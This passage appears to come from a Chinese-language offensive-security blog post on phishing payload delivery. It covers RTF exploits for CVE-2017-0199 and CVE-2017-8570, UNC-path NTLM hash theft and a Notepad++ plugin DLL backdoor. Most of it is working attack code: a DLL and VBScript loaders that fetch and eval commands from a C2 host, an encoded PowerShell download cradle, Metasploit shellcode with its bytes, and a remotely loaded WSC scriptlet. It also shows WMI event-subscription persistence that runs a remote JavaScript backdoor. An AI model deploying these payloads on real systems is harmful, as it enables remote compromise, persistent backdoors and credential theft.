class="headerlink" title="UNCè·¯å¾„"></a>UNCè·¯å¾„</h3><p>UNC(Universal Naming Convention)<br>å°±æ˜¯windowså…±äº«è¿›è¡Œ<br>ç»å…¸ç”¨æ³•:<br><a href="https://github.com/0x09AL/WordSteal" target="_blank" rel="noopener">https://github.com/0x09AL/WordSteal</a></p><p>æ’å…¥UNCè·¯å¾„çš„å›¾ç‰‡çªƒå–ç›®æ ‡ç”¨æˆ·NTMLhash</p><h3 id="Powerpoint-Button"><a href="#Powerpoint-Button" class="headerlink" title="Powerpoint Button"></a>Powerpoint Button</h3><p><img src="/Phishing Attack - æ–‡ä»¶è½åœ°.resources/7E574267-CC0D-4847-B465-4ACB186D797B.png" alt="9524de25b9403cfff1df3282fc5b914c"></p><p><img src="/Phishing Attack - æ–‡ä»¶è½åœ°.resources/8F4F1F9B-CFC0-4864-9613-3BC0D57E54EE.png" alt="5050e237bcc98ba0dfd904dfe9ffa4f7"></p><p><img src="/Phishing Attack - æ–‡ä»¶è½åœ°.resources/7FE8F89E-CE1C-4D53-97AC-8859BC8F6951.png" alt="e63764e020d99c4a5aececdf8cd5c887"></p><h3 id="CVE-2017-0199"><a href="#CVE-2017-0199" class="headerlink" title="CVE-2017-0199"></a>CVE-2017-0199</h3><p>åˆ©ç”¨rtfçš„ç‰¹æ€§ï¼Œå¯ä»¥è‡ªå¯åŠ¨åŠ è½½OLEè°ƒç”¨çš„å¤–éƒ¨ç»„ä»¶ï¼Œé€šè¿‡ä¿®æ”¹Serverçš„MIMEç±»å‹ï¼Œè®©å¼•ç”¨çš„RTFæ–‡æ¡£è§£æä¸ºHTAæ–‡ä»¶ï¼Œæ‰§è¡Œå‘½ä»¤<br>å½±å“ç‰ˆæœ¬ï¼š<br><code>Office 2007,Office 2010,Office 2013,Office 2016</code></p><p>æ³¨æ„ç‚¹ï¼š<br>ä½¿ç”¨Notepad++å°†ç”Ÿæˆçš„rtfæ–‡æ¡£é‡Œçš„<br><code>\object\objautlink\rsltpict</code>æ›¿æ¢ä¸º<code>\object\objautlink\objupdate\rsltpict</code></p><p>è‡³äºä¿®æ”¹File Serverçš„MIMEç±»å‹:<br>ç›´æ¥åœ¨Apache2çš„ä¸»é…ç½®ä¸­ç¼–è¾‘ï¼š<br><code>AddType application/rtf .rtf</code></p><h3 id="CVE-2017-8570"><a href="#CVE-2017-8570" class="headerlink" title="CVE-2017-8570"></a>CVE-2017-8570</h3><p>åŸç†ï¼šåˆ©ç”¨RTFæ–‡æ¡£çš„Packager.dllæ­é…%temp%ç›®å½•ï¼Œå°†.sctä»¥Packagerå¯¹è±¡å­˜å…¥ï¼Œå†ç”¨rtfæ–‡æ¡£å»è°ƒç”¨ä»–ï¼Œå°±å¯ä»¥è¾¾åˆ°åˆ©ç”¨.sctè°ƒç”¨COMæ¥å£æ¥æ‰§è¡Œå‘½ä»¤çš„æ•ˆæœ</p><p><a href="https://github.com/klionsec/PhishingExploit/blob/master/CVE-2017-8570/packager_composite_moniker.py" target="_blank" rel="noopener">https://github.com/klionsec/PhishingExploit/blob/master/CVE-2017-8570/packager_composite_moniker.py</a></p><h2 id="0x01-Notepad-dllåé—¨"><a href="#0x01-Notepad-dllåé—¨" class="headerlink" title="0x01 Notepad++ dllåé—¨"></a>0x01 Notepad++ dllåé—¨</h2><p>å°±æ˜¯åˆ©ç”¨notepad++è‡ªå¸¦çš„import pluginåŠŸèƒ½ï¼Œè°ƒç”¨dllè¾¾åˆ°å‘½ä»¤æ‰§è¡Œ</p><p><img src="/Phishing Attack - æ–‡ä»¶è½åœ°.resources/5B9031F9-6667-4535-B8DC-C1937D69D7E2.png" alt="400502f6e034cc52cd458c0c2451c407"></p><p><img src="/Phishing Attack - æ–‡ä»¶è½åœ°.resources/567F801D-BF7D-415B-B71B-8C69B5FC2655.png" alt="3afea44ee05002f146cd03bebbf5141a"></p><p><img src="/Phishing Attack - æ–‡ä»¶è½åœ°.resources/52DA7410-409A-48B8-A25F-D831E35E4895.png" alt="1877d5f999e0f057f910ad4e17d76273"></p><p>åº”ç”¨åœºæ™¯ï¼š ä¼ªé€ æ’ä»¶è¿›è¡Œé’“é±¼</p><h2 id="0x02-JSRAT"><a href="#0x02-JSRAT" class="headerlink" title="0x02 JSRAT"></a>0x02 JSRAT</h2><p><a href="http://www.anquan.us/static/drops/tips-11764.html" target="_blank" rel="noopener">Javascript Backdoor</a></p><p>æ ¸å¿ƒæ€è·¯æ˜¯åˆ©ç”¨<strong>rundll32.exe</strong>æ‰§è¡Œjavascriptä»£ç <br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert(â€˜fooâ€™);</span><br></pre></td></tr></table></figure></p><p>æ‰€ä»¥ï¼Œä¸ºä»€ä¹ˆå¯ä»¥æ‰§è¡Œå‘¢ï¼Ÿ<br><a href="https://wooyun.js.org/drops/JavaScript%E5%90%8E%E9%97%A8%E6%B7%B1%E5%B1%82%E5%88%86%E6%9E%90.html" target="_blank" rel="noopener">JavaScriptåé—¨æ·±å±‚åˆ†æ</a></p><p><a href="http://www.anquan.us/static/drops/tips-12386.html" target="_blank" rel="noopener">JavaScript Phishing</a></p><h3 id="åˆ©ç”¨DLL-åŠ è½½-JS"><a href="#åˆ©ç”¨DLL-åŠ è½½-JS" class="headerlink" title="åˆ©ç”¨DLL åŠ è½½ JS"></a>åˆ©ç”¨DLL åŠ è½½ JS</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HANDLE hModule, </span></span></span><br><span class="line"><span class="function"><span class="params">                      DWORD  ul_reason_for_call, </span></span></span><br><span class="line"><span class="function"><span class="params">                      LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">                      )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> *command=<span class="string">"cmd.exe /c start rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new\%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");h.Open(\"GET\",\"http://192.168.1.100/connect\",false);try&#123;h.Send();B=h.ResponseText;eval(B);&#125;catch(e)&#123;new\%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im rundll32.exe\",0,true);&#125;"</span>;           </span><br><span class="line">            WinExec(command,SW_HIDE); </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å›å¼¹åˆ°192.168.1.100çš„<a href="https://github.com/3gstudent/Javascript-Backdoor/blob/master/JSRat.ps1" target="_blank" rel="noopener">JSRat.ps1</a></p><h3 id="åˆ©ç”¨-swf-åŠ è½½-JS"><a href="#åˆ©ç”¨-swf-åŠ è½½-JS" class="headerlink" title="åˆ©ç”¨ swf åŠ è½½ JS"></a>åˆ©ç”¨ swf åŠ è½½ JS</h3><p>åŒæ ·çš„ï¼Œåˆ©ç”¨msfè‡ªå¸¦ windows/execæ¨¡å—ç”Ÿæˆshellcode<br><img src="/Phishing Attack - æ–‡ä»¶è½åœ°.resources/DF559A52-42EB-46F2-8F0A-93762C6A891A.png" alt="23adc6883f957f15da50e03cd6dfd4a0"></p><p>åˆ©ç”¨Adobe Flash CS6ç¼–è¯‘ç”Ÿæˆswfï¼Œé…åˆAdobe Flash Playeræ¼æ´å³å¯RCE</p><h3 id="åˆ©ç”¨-æµè§ˆå™¨æ¼æ´-åŠ è½½-JS"><a href="#åˆ©ç”¨-æµè§ˆå™¨æ¼æ´-åŠ è½½-JS" class="headerlink" title="åˆ©ç”¨ æµè§ˆå™¨æ¼æ´ åŠ è½½ JS"></a>åˆ©ç”¨ æµè§ˆå™¨æ¼æ´ åŠ è½½ JS</h3><p>CVE-2014-6332 ç­‰æ¼æ´<br>åˆ©ç”¨é¡µé¢æ‰§è¡ŒVB Script<br><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT LANGUAGE=<span class="string">"VBScript"</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> runmumaa() </span><br><span class="line"><span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line"><span class="keyword">set</span> shell=createobject(<span class="string">"wscript.shell"</span>)</span><br><span class="line">shell.run <span class="string">"rundll32.exe javascript:"</span><span class="string">"\..\mshtml,RunHTMLApplication "</span><span class="string">";document.write();h=new%20ActiveXObject("</span><span class="string">"WinHttp.WinHttpRequest.5.1"</span><span class="string">");h.Open("</span><span class="string">"GET"</span><span class="string">","</span><span class="string">"http://192.168.174.136/connect"</span><span class="string">",false);try&#123;h.Send();B=h.ResponseText;eval(B);&#125;catch(e)&#123;new%20ActiveXObject("</span><span class="string">"WScript.Shell"</span><span class="string">").Run("</span><span class="string">"cmd /c taskkill /f /im rundll32.exe"</span><span class="string">",0,true);&#125;"</span>,<span class="number">0</span></span><br><span class="line"><span class="keyword">end</span> <span class="keyword">function</span></span><br><span class="line"> &lt;/script&gt;</span><br></pre></td></tr></table></figure></p><h3 id="åˆ©ç”¨-VBS-åŠ è½½-JS"><a href="#åˆ©ç”¨-VBS-åŠ è½½-JS" class="headerlink" title="åˆ©ç”¨ VBS åŠ è½½ JS"></a>åˆ©ç”¨ VBS åŠ è½½ JS</h3><p>åˆ©ç”¨VBSè°ƒç”¨Wscript.shellï¼Œè¿è¡Œå‘½ä»¤<br><figure class="highlight vbs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> shell=<span class="built_in">createobject</span>(<span class="string">"wscript.shell"</span>)</span><br><span class="line">shell.run <span class="string">"rundll32.exe javascript:"</span><span class="string">"\..\mshtml,RunHTMLApplication "</span><span class="string">";document.write();h=new%20ActiveXObject("</span><span class="string">"WinHttp.WinHttpRequest.5.1"</span><span class="string">");h.Open("</span><span class="string">"GET"</span><span class="string">","</span><span class="string">"http://192.168.174.136/connect"</span><span class="string">",false);try&#123;h.Send();B=h.ResponseText;eval(B);&#125;catch(e)&#123;new%20ActiveXObject("</span><span class="string">"WScript.Shell"</span><span class="string">").Run("</span><span class="string">"cmd /c taskkill /f /im rundll32.exe"</span><span class="string">",0,true);&#125;"</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure></p><h3 id="åˆ©ç”¨-CHM-åŠ è½½-JS"><a href="#åˆ©ç”¨-CHM-åŠ è½½-JS" class="headerlink" title="åˆ©ç”¨ CHM åŠ è½½ JS"></a>åˆ©ç”¨ CHM åŠ è½½ JS</h3><p>åˆ©ç”¨CHMçš„åé—¨ï¼ŒåŠ è½½JS<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>Mousejack replay<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">command exec </span><br><span class="line"><span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">classid</span>=<span class="string">"clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11"</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">height</span>=<span class="string">1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">"Command"</span> <span class="attr">value</span>=<span class="string">"ShortCut"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">"Button"</span> <span class="attr">value</span>=<span class="string">"Bitmap::shortcut"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">"Item1"</span> <span class="attr">value</span>=<span class="string">',calc.exe'</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">"Item2"</span> <span class="attr">value</span>=<span class="string">"273,1,1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">x.Click();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>å¯æ‰§è¡Œcalc.exe<br>æ›¿æ¢ä¸ºå¯¹åº”jsä»£ç å³å¯<br>ä¾‹å¦‚ï¼š<br>è¿œç¨‹DownloadString JSRA å›è¿C2<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -ep bypass -enc PQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7AC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsASQBFAFgAIAAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADEAMAAzADoAOAAwADgAMQAvADEALwAnACkAOwAKAA==</span><br></pre></td></tr></table></figure></p><h3 id="ç”Ÿæˆ-Shellcode"><a href="#ç”Ÿæˆ-Shellcode" class="headerlink" title="ç”Ÿæˆ Shellcode"></a>ç”Ÿæˆ Shellcode</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">msf5 payload(windows/messagebox) &gt; use windows/<span class="built_in">exec</span></span><br><span class="line"></span><br><span class="line">msf5 payload(windows/<span class="built_in">exec</span>) &gt; <span class="built_in">set</span> CMD rundll32.exe javascript:\<span class="string">"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");h.Open(\"GET\",\"http://192.168.174.136/connect\",false);try&#123;h.Send();B=h.ResponseText;eval(B);&#125;catch(e)&#123;new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im rundll32.exe\",0,true);&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">msf5 payload(windows/exec) &gt; generate -f c</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*</span></span><br><span class="line"><span class="string"> * windows/exec - 500 bytes</span></span><br><span class="line"><span class="string"> * http://www.metasploit.com</span></span><br><span class="line"><span class="string"> * VERBOSE=false, PrependMigrate=false, EXITFUNC=process,</span></span><br><span class="line"><span class="string"> * CMD=rundll32.exe javascript:"</span>\..\mshtml,RunHTMLApplication</span><br><span class="line"><span class="string">";document.write();h=new%20ActiveXObject("</span>WinHttp.WinHttpRequest.5.1<span class="string">");h.Open("</span>GET<span class="string">","</span>http://192.168.174.136/connect<span class="string">",false);try&#123;h.Send();B=h.ResponseText;eva * l(B);&#125;catch(e)&#123;new%20ActiveXObject("</span>WScript.Shell<span class="string">").Run("</span>cmd</span><br><span class="line"> * /c taskkill /f /im rundll32.exe<span class="string">",0,true);&#125;</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string">unsigned char buf[] =</span></span><br><span class="line"><span class="string">"</span>\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x00\x53\xff\xd5\x72\x75\x6e\x64\x6c\x6c\x33\x32\x2e\x65\x78<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x65\x20\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x22\x5c<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x2e\x2e\x5c\x6d\x73\x68\x74\x6d\x6c\x2c\x52\x75\x6e\x48\x54<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x4d\x4c\x41\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x20\x22<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x3b\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x77\x72\x69\x74\x65<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x28\x29\x3b\x68\x3d\x6e\x65\x77\x25\x32\x30\x41\x63\x74\x69<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x76\x65\x58\x4f\x62\x6a\x65\x63\x74\x28\x22\x57\x69\x6e\x48<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x74\x74\x70\x2e\x57\x69\x6e\x48\x74\x74\x70\x52\x65\x71\x75<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x65\x73\x74\x2e\x35\x2e\x31\x22\x29\x3b\x68\x2e\x4f\x70\x65<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x6e\x28\x22\x47\x45\x54\x22\x2c\x22\x68\x74\x74\x70\x3a\x2f<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x2f\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x37\x34\x2e\x31\x33<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x36\x2f\x63\x6f\x6e\x6e\x65\x63\x74\x22\x2c\x66\x61\x6c\x73<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x65\x29\x3b\x74\x72\x79\x7b\x68\x2e\x53\x65\x6e\x64\x28\x29<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x3b\x42\x3d\x68\x2e\x52\x65\x73\x70\x6f\x6e\x73\x65\x54\x65<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x78\x74\x3b\x65\x76\x61\x6c\x28\x42\x29\x3b\x7d\x63\x61\x74<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x63\x68\x28\x65\x29\x7b\x6e\x65\x77\x25\x32\x30\x41\x63\x74<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x69\x76\x65\x58\x4f\x62\x6a\x65\x63\x74\x28\x22\x57\x53\x63<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x72\x69\x70\x74\x2e\x53\x68\x65\x6c\x6c\x22\x29\x2e\x52\x75<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x6e\x28\x22\x63\x6d\x64\x20\x2f\x63\x20\x74\x61\x73\x6b\x6b<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x69\x6c\x6c\x20\x2f\x66\x20\x2f\x69\x6d\x20\x72\x75\x6e\x64<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x6c\x6c\x33\x32\x2e\x65\x78\x65\x22\x2c\x30\x2c\x74\x72\x75<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x65\x29\x3b\x7d\x00<span class="string">";</span></span><br></pre></td></tr></table></figure><h2 id="0x03-WSC"><a href="#0x03-WSC" class="headerlink" title="0x03 WSC"></a>0x03 WSC</h2><p>WSC ï¼š Windows Script<br>WSCæ˜¯å¾®è½¯æä¾›å¿«é€Ÿåˆ›å»ºCOMç»„å»ºçš„é€”å¾„<br>ä¹‹å‰lcxå¸ˆå‚…å¾ˆç«çš„ä¸€ç¯‡æ–‡ç« ï¼š <a href="http://huaidan.org/archives/2574.html" target="_blank" rel="noopener">åˆ©ç”¨wscåˆ›å»ºaspåé—¨</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;    </span><br><span class="line"></span><br><span class="line">&lt;package&gt;</span><br><span class="line">&lt;component id=&quot;testCalc&quot;&gt;    </span><br><span class="line"></span><br><span class="line">&lt;script language=&quot;JScript&quot;&gt;</span><br><span class="line">&lt;![CDATA[</span><br><span class="line">var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;); </span><br><span class="line">]]&gt;</span><br><span class="line">&lt;/script&gt;    </span><br><span class="line"></span><br><span class="line">&lt;/component&gt;</span><br><span class="line">&lt;/package&gt;</span><br></pre></td></tr></table></figure><p>JSæ–‡ä»¶åªéœ€è°ƒç”¨wscå³å¯<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetObject(<span class="string">"script:C:\\testwsc\\test.wsc"</span>);</span><br></pre></td></tr></table></figure></p><p>ä¹Ÿå¯è¿›è¡Œè¿œç¨‹è°ƒç”¨<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetObject(<span class="string">"script:https://raw.githubusercontent.com/patrilic/Backdoors/master/Wsc_backdoor/test.wsc"</span>)</span><br></pre></td></tr></table></figure></p><h2 id="0x04-WMI-Backdoor"><a href="#0x04-WMI-Backdoor" class="headerlink" title="0x04 WMI Backdoor"></a>0x04 WMI Backdoor</h2><p><a href="http://www.anquan.us/static/drops/tips-8260.html" target="_blank" rel="noopener">WMI Backdoor - wooyun Drops</a></p><h4 id="powershell-åˆ©ç”¨"><a href="#powershell-åˆ©ç”¨" class="headerlink" title="powershell åˆ©ç”¨"></a>powershell åˆ©ç”¨</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ä¸åœ¨Clientå’ŒServerç•™ä¸‹ä»»ä½•æ–‡ä»¶</span><br><span class="line">ä¸æ”¹åŠ¨æ³¨å†Œè¡¨</span><br><span class="line">ä»…ä½¿ç”¨powershellå®ç°</span><br></pre></td></tr></table></figure><p><strong>åˆ©ç”¨wmiæ— æ–‡ä»¶å­˜å‚¨payload</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$StaticClass = New-Object Management.ManagementClass(&apos;root\cimv2&apos;, $null,</span><br><span class="line">$null)</span><br><span class="line">$StaticClass.Name = &apos;Win32_EvilClass&apos;</span><br><span class="line">$StaticClass.Put()</span><br><span class="line">$StaticClass.Properties.Add(&apos;EvilProperty&apos; , &quot;This is payload&quot;)</span><br><span class="line">$StaticClass.Put()</span><br></pre></td></tr></table></figure></p><h4 id="powershell-è°ƒç”¨-javascript-backdoor"><a href="#powershell-è°ƒç”¨-javascript-backdoor" class="headerlink" title="powershell è°ƒç”¨ javascript_backdoor"></a>powershell è°ƒç”¨ javascript_backdoor</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$filterName = &apos;filtP1&apos;</span><br><span class="line">$consumerName = &apos;consP1&apos;</span><br><span class="line">$Command =&quot;GetObject(&quot;&quot;script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test&quot;&quot;)&quot;    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$Query = &quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &apos;Win32_PerfFormattedData_PerfOS_System&apos;&quot;    </span><br><span class="line"></span><br><span class="line">$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace &quot;root\subscription&quot; -Arguments @&#123;Name=$filterName;EventNameSpace=&quot;root\cimv2&quot;;QueryLanguage=&quot;WQL&quot;;Query=$Query&#125; -ErrorAction Stop    </span><br><span class="line"></span><br><span class="line">$WMIEventConsumer = Set-WmiInstance -Class ActiveScriptEventConsumer -Namespace &quot;root\subscription&quot; -Arguments @&#123;Name=$consumerName;ScriptingEngine=&apos;JScript&apos;;ScriptText=$Command&#125;    </span><br><span class="line"></span><br><span class="line">Set-WmiInstance -Class __FilterToConsumerBinding -Namespace &quot;root\subscription&quot; -Arguments @&#123;Filter=$WMIEventFilter;Consumer=$WMIEventConsumer&#125;</span><br></pre></td></tr></table></figure><h4 